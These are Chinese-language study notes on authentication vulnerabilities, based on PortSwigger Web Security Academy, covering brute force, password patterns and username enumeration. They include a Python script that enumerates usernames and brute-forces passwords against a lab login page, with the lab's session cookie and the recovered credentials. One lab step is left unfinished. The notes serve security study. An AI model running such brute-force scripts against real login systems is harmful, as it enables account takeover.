# 身分驗證漏洞（Authentication Vulnerabilities）

By: 1PingSun

Ref: [https://portswigger.net/web-security/authentication](https://portswigger.net/web-security/authentication)

---

從概念上，身分驗證漏洞很好理解。但因為身分驗證和安全性直接存在明確的關係，因此相當重要。

身分驗證漏洞允許攻擊者取得敏感資料或敏感功能的權限。他們還公開了額外的攻擊面供利用，因此了解如何辨識和利用身分認證漏洞，並學習如何繞過常見的保護機制相當重要。

在這個章節中，將介紹：

* 網站常見的身分驗證機制
* 這些驗證機制潛在的漏洞
* 不同驗證機制固有的漏洞
* 由於操作不適當造成的典型漏洞
* 如何使自己的驗證機制盡可能的強壯

## 什麼是身分驗證？

身分驗證是一個驗證使用者或客戶端的過程。網站很有可能暴露給任何能夠連上網際網路的人。這使得強壯的身分驗證機制，成為網路安全不可或缺的元素。

以下有三種主要的身分驗證類型：

* Something you **know**：例如密碼或回答安全問題。有時也稱為「knowledge factors」。
* Something you **have**：這是物理的物件，例如手機號碼或安全 Token。有時也稱為「prossession factors」。
* Something you **are** or do：例如你的生物特徵或行為模式。有時也稱為「inheerence factors」。

身分驗證透過一系列技術驗證上述其中一個或多個因子（factor）。

### 身分驗證（Authentication）與授權（Authorization）有什麼區別？

身分驗證是驗證使用者是否是他們要求的身分的過程；授權涉及驗證使用者允許做哪些行為。

例如：身分驗證可以確定使用者 `Carlos123` 存取網頁時，存取者是否與創建此使用者為同一人。

一旦使用者 `Carlos123` 通過驗證，權限將決定他被授權可以做什麼。例如，他可能被授權可以存取其他使用者的個人資訊，或執行刪除其他使用者帳號等操作。

## 身分驗證漏洞是如何產生的？

身分驗證機制中大多數的漏洞是以下兩種之一產生的：

* 身分驗證機制脆弱，因為他無法充分的保護暴力攻擊。
* 邏輯缺陷或錯誤的程式撰寫允許攻擊者完全繞過身分驗證機制。有時也稱為「broken authentication」。

在許多 Web 開發領域，邏輯錯誤會導致網站出現意料之外的行為，這有可能導致安全問題。然而，身分驗證對安全相當重要，所以有缺陷的身分驗證邏輯會使安全問題暴露。

## 身分驗證漏洞會造成什麼影響？

身分驗證漏洞會造成很多影響。如果攻擊者繞過驗證或暴力破解取得其他使用者帳號，就能夠擁有被盜帳號者的所有資料和功能。如果攻擊者能夠入侵高權限的帳號（例如系統管理者），他將能夠控制整個應用，並有可能取得內部架構的權限。

即使只破壞了低權限的帳號，也會使攻擊者能夠存取他不應該擁有的資料，例如敏感的商業資訊。即使該帳號沒有權限存取任何敏感資料，仍然可能允許攻擊者存取其他頁面，從而提供更多攻擊面。通常高嚴重性的攻擊不可能從公開存取的頁面，但可能來自內部的頁面。

## 身分驗證機制漏洞

網站的身分驗證系統通常由多個不同的機制組成，其中可能出現漏洞。有些漏洞在所有情況下都適用，其他的則是透過提供的特定功能。

我們將更仔細研究以下常見的一些漏洞領域：

* 密碼登入的漏洞（password-based login）
* 多重驗證的漏洞（muti-factor authentication）
* 其他驗證機制的漏洞

很多 Labs 需要你列舉使用者名稱並暴力破解密碼。我們提供了[帳號](https://portswigger.net/web-security/authentication/auth-lab-usernames)及[密碼](https://portswigger.net/web-security/authentication/auth-lab-passwords)的字典檔，你需要使用這些字典檔來解決 Labs。

## 密碼登入的漏洞（password-based login）

對於採用基於密碼登錄流程的網站，用戶要麼自己註冊帳戶，要麼由管理員分配帳戶。此帳戶與唯一的用戶名和秘密密碼相關聯，用戶在登錄表單中輸入這些資訊來驗證身份。

在這種情況下，知道秘密密碼被視為用戶身份的充分證明。這意味著如果攻擊者能夠獲得或猜測其他用戶的登錄憑證，網站的安全性就會受到損害。

這可以透過多種方式實現。以下章節展示攻擊者如何使用暴力破解攻擊，以及暴力破解防護中的一些缺陷。你還將了解 HTTP 基本身份驗證中的漏洞。

### 暴力破解攻擊gi

暴力破解攻擊是指攻擊者使用試錯系統來猜測有效的用戶憑證。這些攻擊通常使用用戶名和密碼的詞彙表進行自動化。將此過程自動化，特別是使用專用工具，可能使攻擊者能夠高速進行大量登錄嘗試。

暴力破解並不總是完全隨機地猜測用戶名和密碼。透過使用基本邏輯或公開可用的知識，攻擊者可以調整暴力破解攻擊，做出更有根據的猜測。這大大提高了此類攻擊的效率。如果網站僅依賴基於密碼的登錄作為驗證用戶身份的唯一方法，而沒有實施足夠的暴力破解防護，就可能高度脆弱。

#### 暴力破解用戶名

如果用戶名符合可識別的模式（例如電子郵件地址），則特別容易猜測。例如，以 firstname.lastname@somecompany.com 格式的商業登錄非常常見。然而，即使沒有明顯的模式，有時甚至高權限帳戶也會使用可預測的用戶名創建，例如 admin 或 administrator。

在審計期間，檢查網站是否公開披露潛在的用戶名。例如，你是否能夠在不登錄的情況下訪問用戶配置文件？即使配置文件的實際內容被隱藏，配置文件中使用的名稱有時與登錄用戶名相同。你還應該檢查 HTTP 回應，看是否披露了任何電子郵件地址。有時，回應包含高權限用戶（例如管理員或 IT 支援）的電子郵件地址。

#### 暴力破解密碼

密碼同樣可以被暴力破解，難度因密碼強度而異。許多網站採用某種形式的密碼政策，強制用戶創建高熵密碼，理論上至少更難僅用暴力破解來破解。這通常涉及強制執行具有以下條件的密碼：

- 最小字符數
- 大小寫字母的混合
- 至少一個特殊字符

然而，雖然高熵密碼對於單純的計算機來說很難破解，我們可以利用對人類行為的基本了解來利用用戶無意中引入此系統的漏洞。用戶通常不會創建具有隨機字符組合的強密碼，而是採用他們能記住的密碼，並試圖強行使其符合密碼政策。例如，如果不允許使用 mypassword，用戶可能會嘗試 Mypassword1! 或 Myp4$$w0rd 之類的替代方案。

在政策要求用戶定期更改密碼的情況下，用戶通常只對其首選密碼進行小幅、可預測的更改。例如，Mypassword1! 變成 Mypassword1? 或 Mypassword2!。

這種對可能憑證和可預測模式的了解意味著暴力破解攻擊通常可以比簡單地遍歷每個可能的字符組合更加複雜，因此更加有效。

#### 用戶名枚舉

用戶名枚舉是指攻擊者能夠觀察網站行為的變化，以識別給定的用戶名是否有效。

用戶名枚舉通常發生在登錄頁面（例如，當你輸入有效用戶名但密碼不正確時）或註冊表單（當你輸入已被占用的用戶名時）。這大大減少了暴力破解登錄所需的時間和精力，因為攻擊者能夠快速生成有效用戶名的簡短清單。

在嘗試暴力破解登錄頁面時，你應該特別注意以下方面的任何差異：

* **狀態碼**：在暴力破解攻擊期間，返回的 HTTP 狀態碼對於絕大多數猜測可能是相同的，因為大多數都是錯誤的。如果某個猜測返回不同的狀態碼，這強烈表明用戶名是正確的。網站的最佳做法是無論結果如何都始終返回相同的狀態碼，但這種做法並不總是被遵循。

* **錯誤訊息**：有時返回的錯誤訊息會根據用戶名和密碼是否都不正確，或者只有密碼不正確而有所不同。網站的最佳做法是在兩種情況下都使用相同的通用訊息，但有時會出現小的打字錯誤。即使在字符在渲染頁面上不可見的情況下，僅一個字符的位置錯誤就會使兩個訊息截然不同。

* **回應時間**：如果大多數請求都以相似的回應時間處理，任何偏離此時間的請求都表明幕後發生了不同的事情。這是猜測的用戶名可能正確的另一個指示。例如，網站可能只有在用戶名有效時才檢查密碼是否正確。這個額外步驟可能導致回應時間略微增加。這可能很微妙，但攻擊者可以透過輸入過長的密碼使網站需要明顯更長時間處理，從而使這種延遲更加明顯。

::: tip **Lab: [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)**
1. 寫程式爆破帳號和密碼：
    ```python
    import requests

    def init():
        global cookies, headers, data
        cookies = {
            'session': 'H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
            'sec-ch-ua': '"Not.A/Brand";v="99", "Chromium";v="136"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            # 'cookie': 'session=H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
        }

        data = {
            'username': '1322',
            'password': '123123',
        }

    def enum_username():
        with open('username.txt', 'r') as f:
            usernames = f.readlines()
            for i in usernames:
                data = {
                    'username': i.strip(),
                    'password': '123',
                }

                response = requests.post(
                    'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )
                
                print(f'\rTrying username: {i.strip()}        ', end='')

                if 'Invalid username' not in response.text:
                    print(f'\nFound username: {i.strip()}')
                    break

    def enum_password():
        with open('password.txt', 'r') as f:
            passwords = f.readlines()
            for i in passwords:
                data = {
                    'username': 'ansible',
                    'password': i.strip(),
                }

                response = requests.post(
                    'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )
                
                print(f'\rTrying password: {i.strip()}              ', end='')

                if 'Incorrect password' not in response.text:
                    print(f'\nFound password: {i.strip()}')
                    break

    if __name__ == '__main__':
        init()
        enum_password()
    ```
2. 取得正確帳號為 `ansible`，密碼為 `michelle`，登入後即完成 Lab。
:::

::: tip **Lab: [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)**

1. 嘗試任意登入，發現回應 `Invalid username or password.`
2. 使用 Burp 的 Intruder 枚舉使用者名稱，然而
:::


## 第三方身分驗證機制的漏洞

如果你很喜歡破解身分驗證機制並且已經完成所有身分驗證的題目，你可能會像嘗試 OAuth 身分驗證的 Labs。

::: info Read more
[OAuth authentication](https://portswigger.net/web-security/oauth)
:::

## 防止對你自己的身分驗證機制的攻擊

我們已經展示了網站因實施身份驗證的方式而可能存在漏洞的幾種方式。為了降低你自己的網站遭受此類攻擊的風險，應該嘗試遵守幾項原則。

::: info Read more

* [如何使身分驗證機制安全](https://portswigger.net/web-security/authentication/securing)
:::
